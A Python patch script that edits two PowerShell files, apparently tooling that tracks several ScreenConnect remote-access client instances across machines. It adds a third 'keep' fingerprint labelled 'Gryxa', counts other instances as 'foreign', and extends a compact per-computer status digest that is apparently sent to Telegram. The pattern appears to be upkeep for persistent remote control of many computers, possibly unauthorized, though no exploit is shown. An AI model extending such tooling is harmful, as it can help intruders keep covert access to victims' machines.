from pathlib import Path

# Patch keep fingerprints across core files
KEEP3 = "9908198e668e4750"
OLD_KEEP = ("5f6010579852e507", "f861c8140d453427")
NEW_KEEP = ("5f6010579852e507", "f861c8140d453427", KEEP3)

# --- own_lib.ps1 ---
p = Path("own_lib.ps1")
t = p.read_text(encoding="utf-8")
t = t.replace("# OWN_LIB  BUILD 20260802L13", "# OWN_LIB  BUILD 20260802L14")
t = t.replace(
    "$keep = @('5f6010579852e507','f861c8140d453427')",
    "$keep = @('5f6010579852e507','f861c8140d453427','9908198e668e4750')",
)
t = t.replace(
    "if ($matches[1] -eq '5f6010579852e507') { $prim = \"$($svc.Status)\" }\n"
    "            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = \"$($svc.Status)\" }",
    "if ($matches[1] -eq '5f6010579852e507') { $prim = \"$($svc.Status)\" }\n"
    "            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = \"$($svc.Status)\" }\n"
    "            elseif ($matches[1] -eq '9908198e668e4750') { $script:gryxa = \"$($svc.Status)\" }",
)
# foreign exclude gryxa
t = t.replace(
    "$matches[1] -notin @('5f6010579852e507','f861c8140d453427')",
    "$matches[1] -notin @('5f6010579852e507','f861c8140d453427','9908198e668e4750')",
)
# state: add gryxa field - find state ordered and add
if "gryxa" not in t.split("Update-State")[1][:2500]:
    t = t.replace(
        "$prim = $null; $alt = $null",
        "$prim = $null; $alt = $null; $script:gryxa = $null",
    )
    t = t.replace(
        "prim         = $(if ($prim) { $prim } else { 'MISSING' })\n"
        "        alt          = $(if ($alt) { $alt } else { 'MISSING' })",
        "prim         = $(if ($prim) { $prim } else { 'MISSING' })\n"
        "        alt          = $(if ($alt) { $alt } else { 'MISSING' })\n"
        "        gryxa        = $(if ($script:gryxa) { $script:gryxa } else { 'MISSING' })",
    )
p.write_text(t, encoding="utf-8", newline="\n")
print("own_lib patched")

# --- tg_report.ps1 ---
p = Path("tg_report.ps1")
t = p.read_text(encoding="utf-8")
t = t.replace("BUILD 20260802T14", "BUILD 20260802T15")
t = t.replace(
    "        $tag = if ($fp -eq '5f6010579852e507') { 'KEEP-PRIMARY' }\n"
    "        elseif ($fp -eq 'f861c8140d453427') { 'KEEP-ALT' }",
    "        $tag = if ($fp -eq '5f6010579852e507') { 'KEEP-SEVRZ' }\n"
    "        elseif ($fp -eq 'f861c8140d453427') { 'KEEP-ALT' }\n"
    "        elseif ($fp -eq '9908198e668e4750') { 'KEEP-GRYXA' }",
)
t = t.replace(
    "Where-Object { $_.Name -notmatch '5f6010579852e507|f861c8140d453427' })",
    "Where-Object { $_.Name -notmatch '5f6010579852e507|f861c8140d453427|9908198e668e4750' })",
)
# add gryxa line in report if not present
if "9908198e668e4750" not in t.split("Primary <code>")[1][:800]:
    t = t.replace(
        "- Primary <code>5f6010579852e507</code>: $(Esc $primLine)\n"
        "- Alt <code>f861c8140d453427</code>: $(Esc $altLine)",
        "- Sevrz <code>5f6010579852e507</code>: $(Esc $primLine)\n"
        "- Alt <code>f861c8140d453427</code>: $(Esc $altLine)\n"
        "- Gryxa <code>9908198e668e4750</code>: $(Esc (Get-SvcLine 'ScreenConnect Client (9908198e668e4750)'))",
    )
# compact digest: include gryxa short
if "gryxaShort" not in t:
    t = t.replace(
        "    $altShort = if ($altLine -like 'Running*') { 'OK' } else { '-' }\n"
        "    $text = \"$emoji SCD|$($env:COMPUTERNAME)|prim=$primShort|alt=$altShort|foreign=$foreignN|tasks=$taskOk/5|msi=$msiShort|up=$uptime|b=$Build|$now\"",
        "    $altShort = if ($altLine -like 'Running*') { 'OK' } else { '-' }\n"
        "    $gryxaLine = Get-SvcLine 'ScreenConnect Client (9908198e668e4750)'\n"
        "    $gryxaShort = if ($gryxaLine -like 'Running*') { 'OK' } else { '-' }\n"
        "    $text = \"$emoji SCD|$($env:COMPUTERNAME)|sev=$primShort|gry=$gryxaShort|alt=$altShort|f=$foreignN|t=$taskOk/5|b=$Build\"",
    )
p.write_text(t, encoding="utf-8", newline="\n")
print("tg_report patched")
